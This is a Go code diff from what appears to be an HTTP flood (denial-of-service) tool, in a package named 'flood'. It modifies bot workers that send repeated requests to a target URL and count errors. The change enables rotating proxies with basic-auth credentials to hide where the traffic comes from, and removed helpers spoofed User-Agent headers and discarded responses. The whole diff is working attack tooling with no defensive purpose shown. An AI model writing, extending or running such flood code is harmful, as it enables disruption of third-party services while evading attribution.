@@ -1,17 +1,17 @@
-package pkg
+package flood
 
 import (
 	"context"
 	"crypto/tls"
 	"fmt"
-	"io"
-	"io/ioutil"
 	"net/http"
+	"net/url"
 	"runtime"
+	"strings"
 )
 
 type (
-	BotMsg struct {
+	BotResp struct {
 		ID       int
 		Err      error
 		ErrCount int
@@ -19,8 +19,8 @@ type (
 	}
 
 	Bot struct {
-		c  *http.Client
 		id int
+		c  *http.Client
 	}
 )
 
@@ -31,35 +31,34 @@ func NewBot(id int, getProxy func() *Proxy) (*Bot, error) {
 	tr.MaxIdleConns = 10   // 0 - no limit
 	tr.MaxConnsPerHost = 0 // 0 - no limit
 	tr.IdleConnTimeout = DIAL_TIMEOUT
-	tr.ReadBufferSize = 10
+	tr.ReadBufferSize = 1_000_000
 	tr.DisableCompression = true
 	tr.DisableKeepAlives = true
 
 	tr.Proxy = nil
 
-	// tr.Proxy = func(req *http.Request) (*url.URL, error) {
-	// 	proxy := getProxy()
-	// 	// proxy := (*Proxy)(nil)
-	// 	if proxy == nil {
-	// 		log.WithField("id", id).Println("Надсилаю без проксі")
-	// 		return nil, nil
-	// 	}
+	tr.Proxy = func(req *http.Request) (*url.URL, error) {
+		proxy := getProxy()
+		if proxy == nil {
+			// log.WithField("id", id).Println("Надсилаю без проксі")
+			return nil, nil
+		}
 
-	// 	url, err := url.Parse(proxy.IP)
+		url, err := url.Parse(proxy.IP)
 
-	// 	if err != nil {
-	// 		url, err = url.Parse(req.URL.Scheme + proxy.IP)
-	// 		if err != nil {
-	// 			return nil, err
-	// 		}
-	// 	}
-	// 	a := strings.Split(proxy.Auth, ":")
-	// 	if len(a) > 2 {
-	// 		req.SetBasicAuth(a[0], a[1])
-	// 	}
+		if err != nil {
+			url, err = url.Parse(req.URL.Scheme + proxy.IP)
+			if err != nil {
+				return nil, err
+			}
+		}
+		a := strings.Split(proxy.Auth, ":")
+		if len(a) > 2 {
+			req.SetBasicAuth(a[0], a[1])
+		}
 
-	// 	return url, nil
-	// }
+		return url, nil
+	}
 
 	b := &Bot{
 		id: id,
@@ -69,33 +68,7 @@ func NewBot(id int, getProxy func() *Proxy) (*Bot, error) {
 	return b, nil
 }
 
-func newReq(ctx context.Context, method string, target string) (*http.Request, error) {
-	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
-	if err != nil {
-		return nil, err
-	}
-	// TODO: add some useful headers
-	req.Header.Add("User-Agent", GetUserAgent())
-	req.Header.Add("Cache-Control", "no-store, max-age=0")
-	req.Header.Add("Accept", "application/json, text/plain, */*")
-	req.Header.Add("Accept-Language", "ru")
-	req.Header.Add("x-forward-proto", "https")
-
-	// dumpedBody, _ := httputil.DumpRequest(req, true)
-
-	return req, nil
-}
-
-func toDevNull(readCloser io.ReadCloser) error {
-	defer readCloser.Close()
-	_, err := ioutil.ReadAll(readCloser)
-	if err != nil {
-		return err
-	}
-	return nil
-}
-
-func (b *Bot) Start(ctx context.Context, target string, msgs chan<- BotMsg) {
+func (b *Bot) Start(ctx context.Context, target string, msgs chan<- BotResp) {
 	select {
 	case <-ctx.Done():
 		return
@@ -136,7 +109,7 @@ func (b *Bot) Start(ctx context.Context, target string, msgs chan<- BotMsg) {
 			select {
 			case <-ctx.Done():
 				return
-			case msgs <- BotMsg{ID: b.id, Err: err, Continue: cont, ErrCount: errCount}:
+			case msgs <- BotResp{ID: b.id, Err: err, Continue: cont, ErrCount: errCount}:
 				select {
 				case <-ctx.Done():
 					return
